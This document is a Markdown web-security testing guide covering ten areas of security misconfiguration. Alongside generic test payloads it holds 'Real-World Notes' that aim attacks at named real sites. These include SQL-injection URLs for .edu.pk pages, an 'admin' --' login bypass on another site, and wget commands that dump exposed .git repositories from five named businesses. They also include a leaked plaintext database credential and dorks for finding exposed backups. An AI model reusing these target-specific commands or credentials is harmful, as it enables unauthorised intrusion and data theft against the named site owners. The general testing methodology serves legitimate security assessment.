# ⚙️ Security Misconfiguration

Security Misconfiguration occurs when an application, server, framework, or platform is deployed with **insecure default settings, incomplete configurations, verbose error handling, or unnecessary exposed features**.

Unlike a single coding bug, this is a broad category — it covers everything from a stack trace leaking a file path to a cloud storage bucket left publicly readable. It is consistently one of the OWASP Top 10 categories because it's easy to introduce and easy to miss.

## 🧠 What is Security Misconfiguration?

It can occur at **any layer** of the stack:

- Network / infrastructure level
- Application server (Apache, Nginx, IIS, Tomcat)
- Framework level (Django, Laravel, Spring, Express)
- Database level
- Cloud platform level (AWS S3, Azure Blob, GCP Storage)
- Custom application code (debug mode left on, verbose errors)

Each of the 10 areas below is treated separately with: **where to look**, **what tests to run**, and **how to confirm**.

---

## 1️⃣ Error Handling & Stack Trace

### 📍 Where to look

- Any input field, API parameter, or file upload that can trigger an exception (malformed JSON, wrong data type, missing required field).
- URL path manipulation (`/product/abc` instead of `/product/123`).
- Endpoints that interact with a database, file system, or external service — these throw the most revealing errors.

### 🧪 Tests to run

```
' (single quote in any input field, to break SQL/string parsing)
{"key": invalid_json}
Content-Type: application/xml   # send to a JSON-only endpoint
../../../etc/passwd             # path traversal to trigger file errors
Force a 500 by sending oversized payloads or wrong Content-Length
```

Also try toggling HTTP methods, malformed multipart boundaries, or removing required headers.

### ✅ How to confirm

- Response body contains a **stack trace**, framework version, internal file paths, SQL query fragments, or line numbers.
- HTTP response code is `500` and the body (not just status) reveals internal detail rather than a generic error page.
- Compare behavior in production vs what a properly configured app should show (generic error page, no debug info).

### 🧾 Real-World Notes & Examples

```
value inject -> error -> information

http://codex.giccl.edu.pk/admin_login.php
```

---

## 2️⃣ Full Path Disclosure

### 📍 Where to look

- Error pages (PHP warnings/notices, Python tracebacks, Java stack traces).
- File upload endpoints that echo back a server-side save path.
- Image/PDF generation or file-processing features.
- Verbose `X-Powered-By`, server banners, or debug/log endpoints.

### 🧪 Tests to run

```
Upload a file with an invalid extension or corrupted content
Request a non-existent file: /uploads/nonexistent.png
Trigger a PHP notice: ?page[]=1  (array where string expected)
Access known debug endpoints: /phpinfo.php, /server-status, /debug
```

### ✅ How to confirm

- Response discloses absolute server paths such as `/var/www/html/...`, `C:\inetpub\wwwroot\...`, or `/home/user/app/...`.
- Path reveals OS type, directory structure, username, or application framework/version — useful for chaining with LFI or deserialization attacks.

---

## 3️⃣ Exposes Sensitive Information

### 📍 Where to look

- Publicly accessible config files: `.env`, `config.php`, `web.config`, `appsettings.json`.
- Version control artifacts left on the server: `.git/`, `.svn/`, `.DS_Store`.
- Backup files: `backup.zip`, `db_backup.sql`, `site.tar.gz`, `index.php.bak`.
- API responses that return more fields than the UI displays (over-fetching).

### 🧪 Tests to run

```
GET /.env
GET /.git/config
GET /config.php.bak
GET /backup.sql
GET /.well-known/
ffuf -w wordlist.txt -u https://target.com/FUZZ    # common sensitive filenames
git-dumper / GitTools (if .git/ is found, to reconstruct source)
```

### ✅ How to confirm

- File is retrievable (`HTTP 200`) and contains credentials, API keys, DB connection strings, or internal comments/source code.
- `.git` folder is downloadable and can be reconstructed into full source history.

---

## 4️⃣ Directory Listing

### 📍 Where to look

- Any folder-style URL path without an index file: `/images/`, `/uploads/`, `/backup/`, `/assets/`.
- Paths discovered via fuzzing or linked from JS/CSS files.

### 🧪 Tests to run

```
GET /uploads/
GET /images/
GET /static/
ffuf -w common-dirs.txt -u https://target.com/FUZZ/   # enumerate folders, then check each
```

### ✅ How to confirm

- Server returns an auto-generated index page (e.g., Apache's "Index of /uploads") listing files/subfolders instead of a 403/404.
- Listed files themselves may expose sensitive data (point back to item #3).

### 🧾 Real-World Notes & Examples

```
https://staloysiuspanagar.edu.in/login/
https://staloysiuspanagar.edu.in/login/add-cbse1.php

Index of /.git site:in
Index of /backup site:in
Index of /db site:in
Index of /Movie site:ir
Index of /Sql site:in

intitle:"index of /sql" site:in
inbody:"index of /Film" site:ir
```

**Dumping an exposed `.git` folder:**

```
wget https://www.sprayequipment.co.uk/.git/ --no-parent -r
wget https://www.cdpotterandsons.co.uk/.git/ --no-parent -r
wget https://stoppasozytom.pl/.git/ --no-parent -r
wget https://www.notgeld.com.pl/.git/ --no-parent -r
wget https://firstvoicetraining.com/.git/ --no-parent -r

https://www.therecruiter.miabetepe.com/.git/
https://firstvoicetraining.com/.git/
```

**Exploring the recovered history/source with git:**

```
git log
git show 0f2d30e937293e9ab281b86e4dd1f335bdc14ceb

git ls-files '*.php'
git ls-files '*.sql'
git ls-files '*.xml'

git show HEAD:api.php
git show HEAD:app/code/community/Cm/RedisSession/etc/config.xml
git show HEAD:.configuration.local.xml
git show HEAD:includes/config.php
git show HEAD:sucuri-939fba8d40bab390a9ed16905bae7599.php
git show HEAD:lib/phpseclib/Net/SSH1.php
git show HEAD:shell/ayko/configuration.php
git show HEAD:includes/course.php

# e.g. a leaked DB credential found inside a dumped file:
+@ $fvtdb = new mysqli($host, 'tsdemosc_jbaker', 'Jbake1234', 'tsdemosc_firstvoicetraining');

git show 0d9605b7580f27a70013c6b39b604b3e10ecbdda > result.txt 2>&1
```

---

## 5️⃣ Default Credentials

### 📍 Where to look

- Admin panels: `/admin`, `/wp-admin`, `/manager/html` (Tomcat), `/phpmyadmin`.
- IoT/embedded device web interfaces, routers, printers.
- Database management interfaces (Adminer, pgAdmin, Mongo Express).
- CI/CD and monitoring dashboards (Jenkins, Grafana, Kibana).

### 🧪 Tests to run

```
admin / admin
admin / password
root / root
root / toor
tomcat / tomcat  (Tomcat manager)
Try vendor-specific default creds (lookup by product + "default credentials")
Check for unauthenticated access entirely (no login required at all)
```

### ✅ How to confirm

- Login succeeds with a default or vendor-published credential pair.
- Dashboard/panel grants administrative functionality (user management, file upload, command execution via plugins, etc.).

### 🧾 Real-World Notes & Examples

```
http://site.ir/admin/
username/password: admin/admin

https://osos.co.in/
admin' --
111

inurl:"login.aspx" site:uk
inurl:"admin/login.php" site:in
```

> Note: `admin' --` and a dummy password (`111`) also double as a quick **SQL injection auth-bypass** check on login forms, not just a default-credential check.

---

## 6️⃣ HTTP Verb Tampering

### 📍 Where to look

- Endpoints protected by method-based access rules in server config (e.g., `<Limit GET POST>` in Apache, or framework route guards checking only `GET`/`POST`).
- Admin or restricted actions that only block the "expected" verb.

### 🧪 Tests to run

```
# If GET is blocked/restricted, try:
POST /admin/deleteUser
PUT /admin/deleteUser
DELETE /admin/deleteUser
HEAD /admin/deleteUser
TRACE /admin/deleteUser
OPTIONS /admin/deleteUser          # reveals allowed methods
# Also try method override headers:
X-HTTP-Method-Override: GET
X-HTTP-Method: GET
```

### ✅ How to confirm

- A verb other than the one restricted by access control still reaches the protected logic and performs the action (e.g., access control checks `if method == POST` but the route handler executes for any verb).
- `OPTIONS` response (`Allow:` header) lists verbs that shouldn't be enabled (e.g., `PUT, DELETE, TRACE`).

### 🧾 Real-World Notes & Examples

```
GET /
POST /
PUT /
PATCH /
DELETE /
```

---

## 7️⃣ HTTP Security Headers

### 📍 Where to look

- Every response — headers should be checked globally across the app, not just on the login page.
- Especially check responses serving HTML, JS, and API JSON.

### 🧪 Tests to run

```
curl -I https://target.com
# Check for presence/absence of:
Content-Security-Policy
X-Frame-Options / frame-ancestors
X-Content-Type-Options: nosniff
Strict-Transport-Security
Referrer-Policy
Permissions-Policy
Set-Cookie flags: HttpOnly, Secure, SameSite
```

Tools: `curl -I`, Burp, [securityheaders.com](https://securityheaders.com/), Mozilla Observatory.

### ✅ How to confirm

- Header is missing, set to an insecure value (e.g., `X-Frame-Options` absent → clickjacking PoC with an iframe), or cookies lack `HttpOnly`/`Secure`/`SameSite`.
- Build a quick PoC (e.g., an `<iframe src="https://target.com">` page) to demonstrate the real-world impact of a missing header.

### 🧾 Real-World Notes & Examples

```
cookie -> httpOnly -> false ; secure -> false

https://securityheaders.com/

site.ir -> run as http

https://tsoad.edu.pk/course_details.php?id=83          # sql injection
https://native.edu.pk/detail.php?ComCatID=25%27        # sql injection

Content-Security-Policy -> csp
x-frame-options -> site iframe
x-content-type-options  nosniff -> mime type hijacking
                         <script src="http://ali.ir/1.css">
x-xss-protection        1; mode=block -> xss
strict-transport-security  max-age=31536000; includeSubDomains -> HSTS -> connection over https

server:
powered by:
X-Powered-By: PHP/7.4.33
Server: nginx/1.31.5
```

> Note: missing/weak cookie flags, a missing `Content-Security-Policy`/`X-Frame-Options`, and banner-grabbed versions (`Server`, `X-Powered-By`) often overlap with **item #8 (Information Disclosure)** and can also lead straight into **SQL injection** on the same pages found during header testing.

---

## 8️⃣ Information Disclosure

### 📍 Where to look

- HTTP response headers (`Server`, `X-Powered-By`, `X-AspNet-Version`).
- Comments in HTML/JS source (`<!-- TODO: remove before prod -->`).
- API responses with verbose metadata (internal IDs, debug flags, feature-flag states).
- `robots.txt`, `sitemap.xml`, `/.well-known/security.txt`.

### 🧪 Tests to run

```
curl -I https://target.com                 # banner grabbing
view-source: on key pages, search for "TODO", "FIXME", "key", "secret"
GET /robots.txt
GET /sitemap.xml
Check JS bundles for hardcoded endpoints, internal hostnames, or API keys
```

### ✅ How to confirm

- Disclosed data (framework/server version, internal hostnames, employee names, commented-out code) provides attackers with exploitable context, such as a known CVE tied to that exact version.

---

## 9️⃣ Sensitive Data Exposure

### 📍 Where to look

- Data in transit: forms/APIs submitting over plain `http://` instead of `https://`.
- Data at rest: publicly accessible cloud storage (S3 buckets, Azure Blobs), exposed databases (MongoDB, Elasticsearch with no auth).
- Client-side storage: `localStorage`/`sessionStorage`/cookies holding tokens, PII, or passwords in plaintext.
- API responses returning full objects (e.g., password hashes, SSNs) even when the UI only needs a subset.

### 🧪 Tests to run

```
# Transit
curl http://target.com   # does it redirect to HTTPS, or serve content over plain HTTP?
# Storage buckets
aws s3 ls s3://bucket-name --no-sign-request
curl https://bucket-name.s3.amazonaws.com/
# Open databases
nmap -p 27017,9200,6379 target.com   # Mongo, Elasticsearch, Redis default ports
# Client storage
DevTools > Application tab > inspect localStorage / sessionStorage / cookies
```

### ✅ How to confirm

- Sensitive data (credentials, tokens, PII, financial info) is retrievable without authentication, either over an unencrypted channel or from a publicly reachable storage/database service.
- Browser storage inspection reveals plaintext secrets that should have been server-side only or encrypted.

---

## 🔟 Outdated or Unpatched Software & Frameworks

### 📍 Where to look

- JS libraries and frameworks loaded by the site (check version strings in bundled/minified files).
- Web server / reverse proxy banners (Nginx, Apache, IIS) disclosed via response headers.
- CMS, plugins, and framework version strings in HTML comments, meta tags, or static asset paths.

### 🧾 Real-World Notes & Examples

```
website -> lib js -> cve
nginx -> version -> cve
```

### ✅ How to confirm

- The exact disclosed version (JS library, nginx, framework, CMS) matches a publicly known CVE, and that CVE is confirmed exploitable against the observed configuration.

---

## 🛡️ General Prevention & Remediation



-  ❌ **Never ship debug mode to production:** Disable verbose errors and directory listing.
- ✅ **Harden by default:** Disable debug mode, verbose errors, and directory listing in production.
- ✅ **Remove the unnecessary:** Default accounts, sample apps, unused services/ports, and default pages.
- ✅ **Patch & review configs regularly:** Automate configuration audits (e.g., CIS Benchmarks, cloud security posture tools).
- ✅ **Segment environments:** Keep debug/staging configurations isolated from production.
- ✅ **Enforce secure headers & HTTPS everywhere:** HSTS, CSP, secure cookie flags.
- ✅ **Principle of Least Privilege:** Restrict access to admin panels, management interfaces, and storage buckets by IP/auth.
- ✅ **Automate scanning:** Use tools like Nuclei, Nikto, or cloud-specific scanners (ScoutSuite, Prowler) to catch misconfigurations continuously.


